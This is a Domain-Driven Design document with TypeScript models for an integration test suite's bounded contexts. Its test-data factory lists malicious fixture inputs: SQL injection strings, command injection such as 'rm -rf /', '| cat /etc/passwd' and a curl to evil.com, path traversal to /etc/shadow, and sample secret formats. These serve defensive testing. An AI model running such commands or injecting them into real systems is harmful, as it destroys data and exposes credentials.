# DDD Bounded Contexts: Integration Test Suite

## Overview

This document defines the Domain-Driven Design bounded contexts for the Cross-Package Integration Test Suite, ensuring clear separation of concerns and cohesive domain models.

## Bounded Context Map

```
┌─────────────────────────────────────────────────────────────────┐
│                    CORE DOMAIN                                   │
│                Test Orchestration Context                        │
│                                                                   │
│  Responsibilities:                                               │
│  - Coordinate test execution across packages                    │
│  - Manage test dependencies and sequencing                      │
│  - Handle parallel execution and resource management            │
│  - Integrate with CI/CD pipeline                                │
└────────┬──────────────┬────────────────┬────────────────────────┘
         │              │                │
         │ uses         │ uses           │ uses
         ▼              ▼                ▼
┌────────────────┐  ┌────────────────┐  ┌────────────────┐
│  SUPPORTING     │  │  SUPPORTING     │  │  SUPPORTING     │
│  Test Data     │  │  Test          │  │  Test          │
│  Generation    │  │  Validation    │  │  Reporting     │
│                │  │                │  │                │
│  - Factories   │◄─┤  - Validators  │─►│  - Reports     │
│  - Builders    │  │  - Comparators │  │  - Dashboards  │
│  - Generators  │  │  - Detectors   │  │  - Analytics   │
└────────────────┘  └────────────────┘  └────────────────┘
         │                   │                   │
         └───────────────────┴───────────────────┘
                             │
                             ▼
                    ┌────────────────┐
                    │   GENERIC       │
                    │   Learning      │
                    │   System        │
                    │   (ACL)         │
                    │                 │
                    │ - Pattern Store │
                    │ - Optimization  │
                    │ - Feedback Loop │
                    └────────────────┘
```

## Context 1: Test Orchestration (Core Domain)

### Ubiquitous Language
- **Test Suite**: Collection of related test scenarios
- **Test Scenario**: Individual test case with setup/teardown
- **Test Execution**: Runtime instance of a test scenario
- **Dependency Graph**: DAG of package dependencies
- **Execution Order**: Sequencing strategy for test execution
- **Resource Pool**: Available compute resources for tests

### Domain Model

```typescript
// Aggregates
class TestSuite {
  private readonly id: TestSuiteId
  private readonly scenarios: TestScenario[]
  private readonly configuration: TestConfiguration
  private executionHistory: TestExecution[]
  
  constructor(
    id: TestSuiteId,
    scenarios: TestScenario[],
    config: TestConfiguration
  ) {
    this.validateScenarios(scenarios) // Domain invariant
    this.id = id
    this.scenarios = scenarios
    this.configuration = config
    this.executionHistory = []
  }
  
  async execute(executor: TestExecutor): Promise<TestResult> {
    const execution = new TestExecution(this.id)
    this.executionHistory.push(execution)
    
    return executor.run(this.scenarios, this.configuration)
  }
  
  addScenario(scenario: TestScenario): void {
    if (this.hasDuplicate(scenario)) {
      throw new DomainError('Duplicate scenario detected')
    }
    this.scenarios.push(scenario)
  }
  
  private validateScenarios(scenarios: TestScenario[]): void {
    // Domain invariant: all scenarios must have unique IDs
    const ids = scenarios.map(s => s.id)
    if (new Set(ids).size !== ids.length) {
      throw new DomainError('Scenarios must have unique IDs')
    }
  }
}

// Entities
class TestScenario {
  readonly id: ScenarioId
  readonly name: string
  readonly packages: PackageId[]
  readonly dependencies: ScenarioId[]
  private timeout: Duration
  
  constructor(
    id: ScenarioId,
    name: string,
    packages: PackageId[],
    timeout: Duration = Duration.seconds(30)
  ) {
    this.validatePackages(packages)
    this.id = id
    this.name = name
    this.packages = packages
    this.dependencies = []
    this.timeout = timeout
  }
  
  addDependency(scenarioId: ScenarioId): void {
    if (this.createsCycle(scenarioId)) {
      throw new DomainError('Circular dependency detected')
    }
    this.dependencies.push(scenarioId)
  }
  
  private validatePackages(packages: PackageId[]): void {
    // Domain invariant: must test at least 2 packages (integration!)
    if (packages.length < 2) {
      throw new DomainError('Integration test must span multiple packages')
    }
  }
}

// Value Objects
class TestConfiguration {
  readonly parallelism: number
  readonly timeout: Duration
  readonly retryStrategy: RetryStrategy
  readonly environment: TestEnvironment
  
  constructor(
    parallelism: number,
    timeout: Duration,
    retryStrategy: RetryStrategy,
    environment: TestEnvironment
  ) {
    this.validateParallelism(parallelism)
    this.parallelism = parallelism
    this.timeout = timeout
    this.retryStrategy = retryStrategy
    this.environment = environment
  }
  
  private validateParallelism(value: number): void {
    if (value < 1 || value > 16) {
      throw new DomainError('Parallelism must be between 1 and 16')
    }
  }
}

// Domain Services
class TestExecutor {
  constructor(
    private readonly dependencyResolver: DependencyResolver,
    private readonly resourceManager: ResourceManager,
    private readonly reporter: TestReporter
  ) {}
  
  async run(
    scenarios: TestScenario[],
    config: TestConfiguration
  ): Promise<TestResult> {
    const executionOrder = this.dependencyResolver.resolve(scenarios)
    const results: ScenarioResult[] = []
    
    for (const batch of this.createBatches(executionOrder, config.parallelism)) {
      const batchResults = await Promise.all(
        batch.map(scenario => this.executeScenario(scenario, config))
      )
      results.push(...batchResults)
    }
    
    return new TestResult(results)
  }
  
  private async executeScenario(
    scenario: TestScenario,
    config: TestConfiguration
  ): Promise<ScenarioResult> {
    const resources = await this.resourceManager.allocate(scenario)
    
    try {
      return await withTimeout(
        scenario.execute(resources),
        config.timeout
      )
    } finally {
      await this.resourceManager.release(resources)
    }
  }
}

// Repository
interface TestSuiteRepository {
  save(suite: TestSuite): Promise<void>
  findById(id: TestSuiteId): Promise<TestSuite | null>
  findByPackages(packages: PackageId[]): Promise<TestSuite[]>
  findAll(): Promise<TestSuite[]>
}
```

### Domain Events

```typescript
class TestExecutionStarted {
  constructor(
    readonly suiteId: TestSuiteId,
    readonly timestamp: Date,
    readonly scenarioCount: number
  ) {}
}

class TestScenarioCompleted {
  constructor(
    readonly scenarioId: ScenarioId,
    readonly result: ScenarioResult,
    readonly duration: Duration
  ) {}
}

class TestSuiteCompleted {
  constructor(
    readonly suiteId: TestSuiteId,
    readonly result: TestResult,
    readonly totalDuration: Duration
  ) {}
}
```

## Context 2: Test Data Generation (Supporting Domain)

### Ubiquitous Language
- **Test Data**: Input data for test scenarios
- **Factory**: Creates domain-specific test data
- **Builder**: Constructs complex test scenarios
- **Generator**: Produces randomized or patterned data
- **Fixture**: Pre-defined test data set
- **Seeder**: Populates databases with test data

### Domain Model

```typescript
// Aggregate
class TestDataSet {
  private readonly id: DataSetId
  private readonly generators: Map<string, DataGenerator>
  private readonly validationRules: ValidationRules
  private data: Map<string, unknown>
  
  constructor(
    id: DataSetId,
    validationRules: ValidationRules
  ) {
    this.id = id
    this.generators = new Map()
    this.validationRules = validationRules
    this.data = new Map()
  }
  
  registerGenerator(name: string, generator: DataGenerator): void {
    if (this.generators.has(name)) {
      throw new DomainError(`Generator ${name} already registered`)
    }
    this.generators.set(name, generator)
  }
  
  generate<T>(generatorName: string): T {
    const generator = this.generators.get(generatorName)
    if (!generator) {
      throw new DomainError(`Generator ${generatorName} not found`)
    }
    
    const data = generator.generate()
    this.validate(data)
    this.data.set(generatorName, data)
    
    return data as T
  }
  
  private validate(data: unknown): void {
    const result = this.validationRules.validate(data)
    if (!result.isValid) {
      throw new DomainError(`Invalid test data: ${result.errors.join(', ')}`)
    }
  }
}

// Factories
class PerformanceDataFactory {
  createFlashAttentionData(): FlashAttentionTestData {
    return {
      queryVectors: this.generateVectors(100, 768),
      keyVectors: this.generateVectors(100, 768),
      valueVectors: this.generateVectors(100, 768),
      config: {
        blockSize: 64,
        attentionScale: Math.sqrt(768)
      }
    }
  }
  
  createHNSWData(): HNSWTestData {
    return {
      vectors: this.generateVectors(10000, 768),
      queryVectors: this.generateVectors(100, 768),
      config: {
        efConstruction: 200,
        M: 16,
        efSearch: 50
      }
    }
  }
  
  private generateVectors(count: number, dim: number): number[][] {
    return Array.from({ length: count }, () =>
      Array.from({ length: dim }, () => Math.random() * 2 - 1)
    )
  }
}

class SecurityDataFactory {
  createMaliciousInputs(): MaliciousInputTestData {
    return {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--"
      ],
      commandInjection: [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl evil.com"
      ],
      pathTraversal: [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/shadow"
      ],
      secrets: [
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_abcdefghijklmnopqrstuvwxyz123456",
        "sk-ant-api03-1234567890abcdef"
      ]
    }
  }
  
  createValidInputs(): ValidInputTestData {
    return {
      commands: [
        "agent spawn --type coder",
        "memory search --query patterns",
        "hooks route --task implement"
      ],
      paths: [
        "/home/user/project",
        "./src/components",
        "packages/performance"
      ]
    }
  }
}
```

## Context 3: Test Validation (Supporting Domain)

### Ubiquitous Language
- **Assertion**: Boolean expression verifying test outcome
- **Regression**: Degradation from previous baseline
- **Snapshot**: Saved state for comparison
- **Baseline**: Reference point for regression detection
- **Threshold**: Acceptable variance from expected value

### Domain Model

```typescript
// Aggregate
class TestResult {
  private readonly testId: TestId
  private readonly assertions: AssertionResult[]
  private readonly metrics: TestMetrics
  private regressions: Regression[]
  private status: TestStatus
  
  constructor(testId: TestId, assertions: AssertionResult[], metrics: TestMetrics) {
    this.testId = testId
    this.assertions = assertions
    this.metrics = metrics
    this.regressions = []
    this.status = this.calculateStatus()
  }
  
  detectRegressions(baseline: TestResult): Regression[] {
    const detected: Regression[] = []
    
    // Performance regression
    if (this.metrics.executionTime > baseline.metrics.executionTime * 1.1) {
      detected.push(new Regression(
        'performance',
        `Execution time increased by ${this.calculateIncrease(baseline)}%`
      ))
    }
    
    // Coverage regression
    if (this.metrics.coverage < baseline.metrics.coverage - 5) {
      detected.push(new Regression(
        'coverage',
        `Coverage decreased by ${baseline.metrics.coverage - this.metrics.coverage}%`
      ))
    }
    
    this.regressions = detected
    return detected
  }
  
  markAsRegression(): void {
    // Domain invariant: can only mark failed tests as regressions
    if (this.status === TestStatus.PASSED) {
      throw new DomainError('Cannot mark passing test as regression')
    }
    this.status = TestStatus.REGRESSION
  }
  
  private calculateStatus(): TestStatus {
    const allPassed = this.assertions.every(a => a.passed)
    return allPassed ? TestStatus.PASSED : TestStatus.FAILED
  }
}

// Domain Services
class BreakingChangeDetector {
  async detect(
    current: PackageAPI,
    previous: PackageAPI
  ): Promise<BreakingChange[]> {
    const changes: BreakingChange[] = []
    
    // Detect removed functions
    for (const func of previous.functions) {
      if (!current.functions.find(f => f.name === func.name)) {
        changes.push(new BreakingChange(
          'removed_function',
          `Function ${func.name} was removed`
        ))
      }
    }
    
    // Detect changed signatures
    for (const func of current.functions) {
      const prev = previous.functions.find(f => f.name === func.name)
      if (prev && !this.signaturesMatch(func, prev)) {
        changes.push(new BreakingChange(
          'changed_signature',
          `Function ${func.name} signature changed`
        ))
      }
    }
    
    return changes
  }
}
```

## Context 4: Test Reporting (Supporting Domain)

### Domain Model

```typescript
class TestReport {
  private readonly id: ReportId
  private readonly results: TestResult[]
  private readonly metadata: ReportMetadata
  private sections: ReportSection[]
  
  constructor(results: TestResult[], metadata: ReportMetadata) {
    this.id = ReportId.generate()
    this.results = results
    this.metadata = metadata
    this.sections = this.buildSections()
  }
  
  generateHTML(): string {
    return new HTMLReportFormatter().format(this)
  }
  
  generateJSON(): string {
    return JSON.stringify(this, null, 2)
  }
  
  private buildSections(): ReportSection[] {
    return [
      new SummarySection(this.results),
      new CoverageSection(this.extractCoverage()),
      new RegressionSection(this.extractRegressions()),
      new PerformanceSection(this.extractMetrics())
    ]
  }
}
```

## Anti-Corruption Layers

### Performance Package ACL

```typescript
class PerformanceAdapter {
  toTestData(metrics: PerformanceMetrics): PerformanceTestData {
    return {
      flashAttention: {
        executionTime: metrics.flashAttentionTime,
        throughput: metrics.flashAttentionThroughput
      },
      hnsw: {
        searchTime: metrics.hnswSearchTime,
        recall: metrics.hnswRecall
      },
      cache: {
        hitRate: metrics.cacheHitRate,
        evictions: metrics.cacheEvictions
      }
    }
  }
  
  fromTestConfig(config: TestConfiguration): PerformanceConfig {
    return {
      parallelism: config.parallelism,
      timeout: config.timeout.milliseconds,
      profiling: true
    }
  }
}
```

### Learning Package ACL

```typescript
class LearningAdapter {
  async storeTestPattern(result: TestResult): Promise<void> {
    if (result.status === TestStatus.PASSED) {
      await reasoningBank.store({
        pattern: this.extractPattern(result),
        verdict: 'success',
        metadata: {
          timestamp: new Date(),
          testId: result.testId
        }
      })
    }
  }
  
  async retrieveSimilarTests(scenario: TestScenario): Promise<TestResult[]> {
    const query = this.buildQuery(scenario)
    const results = await reasoningBank.search(query, { limit: 5 })
    return results.map(r => this.toTestResult(r))
  }
}
```

## Context Relationships

**Shared Kernel**: None - All contexts are loosely coupled

**Customer-Supplier**: 
- Test Orchestration (customer) ← Test Data Generation (supplier)
- Test Orchestration (customer) ← Test Validation (supplier)

**Conformist**:
- Test Reporting → Test Orchestration (conforms to orchestration results)

**Anti-Corruption Layer**:
- All contexts → External packages (via ACLs)

## References
- [Bounded Context - Martin Fowler](https://martinfowler.com/bliki/BoundedContext.html)
- [DDD Aggregates](https://martinfowler.com/bliki/DDD_Aggregate.html)
- [Context Mapping](https://www.infoq.com/articles/ddd-contextmapping/)

## Metadata
- **Author**: AgentScope Team
- **Date**: 2026-01-30
- **Version**: 1.0
